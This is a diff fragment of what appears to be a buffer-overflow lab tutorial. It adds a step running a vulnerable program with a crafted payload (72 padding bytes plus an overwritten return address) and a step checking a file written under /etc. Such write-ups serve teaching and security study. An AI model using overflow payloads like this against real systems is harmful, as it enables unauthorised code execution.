@@ -137,11 +137,21 @@ Make a note of the address is `0xf7fcc5b4`; you'll use it in the next step.
 
 Run the vulnerable program with the crafted payload:
 
+```bash
+./redundant_code "$(python -c "print('a'*72 + '\xb4\xc5\xfc\xf7')")"
+```
 
 
+## 8. Verify the Output
+
+```bash
+cat /etc/outfile
+```
+
+![image](https://github.com/user-attachments/assets/ef6984a4-6a33-45d3-80b7-aae79745d59f)
 
 
-
+![image](https://github.com/user-attachments/assets/56fa25ea-0a95-44ba-a009-1a78bd406e6a)
 
 
 
